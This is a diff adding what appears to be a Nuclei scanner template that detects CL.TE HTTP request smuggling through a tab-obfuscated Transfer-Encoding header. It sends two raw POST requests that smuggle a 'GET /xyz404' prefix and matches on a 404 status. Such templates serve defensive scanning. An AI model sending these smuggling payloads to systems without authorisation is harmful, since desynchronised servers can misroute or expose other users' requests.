@@ -1,0 +1,44 @@
+id: smuggling-cl-te-mid09
+
+info:
+  name: HTTP Request Smuggling - CL.TE - Mid_09 [Tab Space] TE header
+  author: aravazhimdr
+  severity: info
+  tags: smuggling,cl.te
+
+requests:
+  - raw:
+    - |
+      POST / HTTP/1.1
+      Transfer-Encoding	: chunked
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+      Connection: keep-alive
+      Cookie: AS=sa
+      Content-Length: 38
+      
+      0
+      
+      GET /xyz404 HTTP/1.1
+      X-Ignore: X
+    - |
+      POST / HTTP/1.1
+      Transfer-Encoding	: chunked
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+      Connection: keep-alive
+      Cookie: AS=sa
+      Content-Length: 38
+      
+      0
+      
+      GET /xyz404 HTTP/1.1
+      X-Ignore: X
+      
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==404'
